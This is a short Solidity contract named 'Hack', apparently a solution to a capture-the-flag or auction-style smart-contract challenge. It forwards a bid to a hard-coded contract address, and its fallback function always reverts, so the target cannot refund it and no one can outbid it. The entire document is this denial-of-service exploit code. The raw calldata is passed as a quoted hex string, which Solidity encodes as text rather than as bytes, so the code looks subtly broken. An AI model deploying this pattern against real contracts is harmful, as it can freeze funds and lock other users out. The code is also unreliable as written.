pragma solidity ^0.5.16;


contract Hack { 
    
    function () external payable {
        revert("Get out of here");
    }
    
    function smallBid() public payable {
        (bool success,bytes memory  _ ) = address(0x0Ba51d9C015a7544E3560081Ceb16fFe222DD64f).call.value(msg.value)(
           '0xf9d83bb5000000000000000000000000000000000000000000000000000000000000495b0000000000000000000000002a46f2ffd99e19a89476e2f62270e0a35bbf0756'
        );

        require(success, "error");
    }
}
